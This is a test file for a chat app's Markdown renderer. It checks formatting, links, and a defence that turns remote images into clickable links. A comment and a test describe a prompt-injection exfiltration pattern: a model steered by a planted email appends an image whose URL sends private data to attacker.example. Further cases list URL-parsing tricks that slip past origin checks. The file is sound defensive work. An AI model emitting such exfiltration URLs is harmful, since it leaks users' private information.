import { render, screen } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { describe, expect, it } from 'vitest';

import { Markdown, isOwnOriginImage } from './Markdown';

describe('Markdown', () => {
  it('renders bold text and links', () => {
    render(<Markdown>{'Hello **world** and [a link](https://example.com)'}</Markdown>);

    expect(screen.getByText('world').tagName).toBe('STRONG');
    expect(screen.getByRole('link', { name: 'a link' })).toHaveAttribute('href', 'https://example.com');
  });

  it('renders unordered lists', () => {
    render(<Markdown>{'- one\n- two'}</Markdown>);

    const items = screen.getAllByRole('listitem');
    expect(items.map((li) => li.textContent)).toEqual(['one', 'two']);
  });

  it('renders GFM tables', () => {
    render(<Markdown>{'| A | B |\n| - | - |\n| 1 | 2 |'}</Markdown>);

    expect(screen.getByRole('table')).toBeInTheDocument();
    expect(screen.getByRole('columnheader', { name: 'A' })).toBeInTheDocument();
    expect(screen.getByRole('cell', { name: '1' })).toBeInTheDocument();
  });

  describe('images', () => {
    it('renders a site-relative image', () => {
      render(<Markdown>{'![a photo](/api/files/abc/thumbnail)'}</Markdown>);

      expect(screen.getByRole('img', { name: 'a photo' })).toHaveAttribute('src', '/api/files/abc/thumbnail');
    });

    it('renders an absolute image on this origin', () => {
      const src = `${window.location.origin}/api/files/abc/thumbnail`;
      render(<Markdown>{`![a photo](${src})`}</Markdown>);

      expect(screen.getByRole('img', { name: 'a photo' })).toHaveAttribute('src', src);
    });

    it('never fetches a remote image: it becomes a link the reader can choose to open', () => {
      // The exfiltration shape: a model steered by a planted email ends its
      // reply with an image whose query string carries what it just read. An
      // <img> would fire on paint; a link fires only on a click.
      const src = 'https://attacker.example/log?d=home+address';
      render(<Markdown>{`Here you go. ![](${src})`}</Markdown>);

      expect(screen.queryByRole('img')).not.toBeInTheDocument();
      const link = screen.getByRole('link', { name: src });
      expect(link).toHaveAttribute('href', src);
      expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    });

    it('treats a protocol-relative source as remote', () => {
      render(<Markdown>{'![x](//attacker.example/p.png)'}</Markdown>);

      expect(screen.queryByRole('img')).not.toBeInTheDocument();
      expect(screen.getByRole('link', { name: 'x' })).toBeInTheDocument();
    });
  });

  describe('isOwnOriginImage', () => {
    // The chat's streaming renderer hands this the URL exactly as the model
    // wrote it — nothing has percent-encoded it the way the Markdown path does
    // — so it must read a source the way the browser's URL parser will.
    it.each([
      ['a site-relative path', '/api/files/abc/thumbnail', true],
      ['an absolute URL on this origin', `${window.location.origin}/api/files/abc/thumbnail`, true],
      ['a remote URL', 'https://attacker.example/p.png', false],
      ['a protocol-relative URL', '//attacker.example/p.png', false],
      ['a backslash the parser reads as a second slash', '/\\attacker.example/p.png', false],
      ['a tab the parser deletes', '/\t/attacker.example/p.png', false],
      ['a newline the parser deletes', '/\n/attacker.example/p.png', false],
      ['leading whitespace the parser trims', ' //attacker.example/p.png', false],
    ])('%s → %s', (_label, src, expected) => {
      expect(isOwnOriginImage(src)).toBe(expected);
    });
  });

  it('renders nothing for empty content', () => {
    const { container } = render(<Markdown>{''}</Markdown>);

    expect(container).toBeEmptyDOMElement();
  });

  describe('inline', () => {
    // Verbatim from a feed Summary card, which rendered the asterisks literally
    // before these slots were routed through this component.
    const BULLET = '**High Communication Volume:** Three items were logged under Communications.';

    it('still renders emphasis', () => {
      render(<Markdown inline>{BULLET}</Markdown>);

      expect(screen.getByText('High Communication Volume:').tagName).toBe('STRONG');
      expect(screen.queryByText(/\*\*/)).not.toBeInTheDocument();
    });

    it('omits the paragraph wrapper so it can live inside an li', () => {
      const { container } = render(<Markdown inline>{BULLET}</Markdown>);

      expect(container.querySelector('p')).toBeNull();
    });

    it('keeps the paragraph wrapper when not inline', () => {
      const { container } = render(<Markdown>{BULLET}</Markdown>);

      expect(container.querySelector('p')).not.toBeNull();
    });
  });

  it('renders an internal path as a client-side link inside a router', () => {
    // What the chat's search tools hand the model as `link`; a full reload
    // here would drop the open conversation.
    render(
      <MemoryRouter>
        <Markdown>{"Here's the photo: [Squirrel](/content/abc-123)"}</Markdown>
      </MemoryRouter>,
    );

    const link = screen.getByRole('link', { name: 'Squirrel' });
    expect(link).toHaveAttribute('href', '/content/abc-123');
  });

  it('leaves an external URL as a plain anchor inside a router', () => {
    render(
      <MemoryRouter>
        <Markdown>{'[out](https://example.com/x)'}</Markdown>
      </MemoryRouter>,
    );

    expect(screen.getByRole('link', { name: 'out' })).toHaveAttribute('href', 'https://example.com/x');
  });

  it('does not treat a protocol-relative URL as internal', () => {
    render(
      <MemoryRouter>
        <Markdown>{'[evil](//example.com/x)'}</Markdown>
      </MemoryRouter>,
    );

    expect(screen.getByRole('link', { name: 'evil' })).toHaveAttribute('href', '//example.com/x');
  });

  it('still renders an internal path as an anchor with no router', () => {
    render(<Markdown>{'[Squirrel](/content/abc-123)'}</Markdown>);

    expect(screen.getByRole('link', { name: 'Squirrel' })).toHaveAttribute('href', '/content/abc-123');
  });
});
